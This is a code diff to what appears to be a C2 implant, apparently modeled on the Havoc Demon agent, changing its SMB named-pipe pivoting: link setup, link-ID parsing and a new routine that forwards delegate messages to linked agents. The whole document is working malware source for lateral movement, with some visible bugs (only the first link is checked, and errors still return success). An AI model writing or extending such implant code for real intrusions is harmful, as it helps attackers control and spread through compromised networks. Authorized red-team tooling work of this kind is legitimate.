@@ -25,15 +25,10 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
         return;
     }
 
-    SIZE_T targetLen    = 0;
     SIZE_T pipeLen      = 0;
-    // PCHAR  Target 		= ParserGetString(arguments, &targetLen);
-    PCHAR Target = "test";
 	PCHAR  PipeName     = ParserGetString(arguments, &pipeLen);
 
-    _dbg("SMB Link Target: %s", Target);
     _dbg("SMB Link PipeName: %s", PipeName);
-
 
     /* Output */
     PVOID outBuf  = NULL;
@@ -42,7 +37,7 @@ VOID Link(PCHAR taskUuid, PPARSER arguments)
 
     /* Connect to Pivot Agent */
     DWORD Result = 0;
-    if ( !LinkAdd(Target, PipeName, &outBuf, &outLen) ) 
+    if ( !LinkAdd(PipeName, &outBuf, &outLen) ) 
     {
         _err("Failed to link smb agent.");
         Result = GetLastError();
@@ -89,8 +84,7 @@ VOID UnLink(PCHAR taskUuid, PPARSER arguments)
 
 
 /**
- * Helper Functions
- * 
+ *  Helper Functions
  */
 
 
@@ -101,7 +95,7 @@ VOID UnLink(PCHAR taskUuid, PPARSER arguments)
  * @ref Based on Havoc - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Pivot.c  
  * @return BOOL  
  */
-BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
+BOOL LinkAdd( PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
 {
     PLINKS LinkData    = NULL;
     HANDLE hPipe       = NULL;
@@ -160,17 +154,15 @@ BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
     // Add this Pivot Link to list
     {
         _dbg("Read %d bytes of data from Link.\n", *outLen);
-        //PCHAR NewLinkId = NULL;                                                 // Allocated in PivotParseLinkId must free
-        //PivotParseLinkId(*outBuf, *outLen, *NewLinkId); 
-
-        // _dbg("Found Link ID : %s", NewLinkId);
-
-// TODO Crashing here
+        
 
         LinkData                  = LocalAlloc(LPTR, sizeof(LINKS));
         LinkData->hPipe           = hPipe;
         LinkData->Next            = NULL;
-        // LinkData->LinkId          = NewLinkId;
+        LinkData->LinkId          = PivotParseLinkId(*outBuf, *outLen);
+
+        _dbg("Found Link ID : %x", LinkData->LinkId);
+
         LinkData->PipeName        = LocalAlloc(LPTR, strlen(PipeName));        // TODO - Check this feels like an issue
         memcpy( LinkData->PipeName, PipeName, strlen(PipeName) );
 
@@ -205,26 +197,68 @@ BOOL LinkAdd( PCHAR Target, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen )
     return TRUE;
 }
 
-// VOID PivotParseLinkId( PVOID buffer, SIZE_T size, PCHAR* LinkId )
-// {
-//     PARSER Parser   = { 0 };
-//     PCHAR Value     = NULL;
-//     SIZE_T uuidLen  = 36;
 
-//     _dbg("Creating new parser object to read buffer");
+BOOL LinkForward( PPARSER delegates )
+{
+    /** New Packet Format
+     * 
+     * ( isDelegates? + NumOfDelegates + ( ID + SizeOfMessage + BASE64_MESSAGE ) )
+     */
+    BOOL   Success          = FALSE;
+    UINT32 NumOfDelegates   = ParserGetInt32(delegates);
+    
+    /* Process all delegate messages */
+    for ( INT i = 0; i < NumOfDelegates; i++ )
+    {
+        SIZE_T  szId     = 0;
+        SIZE_T  szMsg    = 0;
+        UINT32  LinkId   = ParserGetInt32(delegates);
+        PLINKS  TempLink = xenonConfig->SmbLinks;
 
-//     ParserNew( &Parser, buffer, size );
+        _dbg("Got Delegate message with Link ID - %x", LinkId);
 
-//     _dbg("Extracting ID? But not really lol");
+        // TODO - create a loop for checking all Links in list
+        
+        if ( LinkId == TempLink->LinkId )
+        {
+            SIZE_T sizeOfMsg = ParserGetInt32(delegates);
 
-//     Value  = ParserStringCopy(&Parser, &uuidLen);
+            _dbg("Delegate message Link ID %x with %d bytes", LinkId, sizeOfMsg);
 
-//     _dbg("Parsed SMB Link UUID => %s \n", Value);
+            if ( !PackageSendPipe(TempLink->hPipe, delegates->Buffer, sizeOfMsg) ) {
+                DWORD error = GetLastError();
+		        _err("Failed to write data to pipe. ERROR : %d", error);
+                goto END;
+            }
+        }
+    }
 
-//     ParserDestroy(&Parser);
+    Success = TRUE;
 
-//     *LinkId = Value;
-// }
+END:
+
+    return TRUE;
+}
+
+
+UINT32 PivotParseLinkId( PVOID buffer, SIZE_T size )
+{
+    PARSER  Parser    = { 0 };
+    UINT32  Value     = 0;
+
+    _dbg("Creating new parser object to read buffer");
+
+    ParserNew( &Parser, buffer, size );
+
+    // Value  = ParserStringCopy(&Parser, &uuidLen);
+    Value = ParserGetInt32(&Parser);
+
+    _dbg("Parsed SMB Link ID => %x \n", Value);
+
+    ParserDestroy(&Parser);
+
+    return Value;
+}
 
 
 
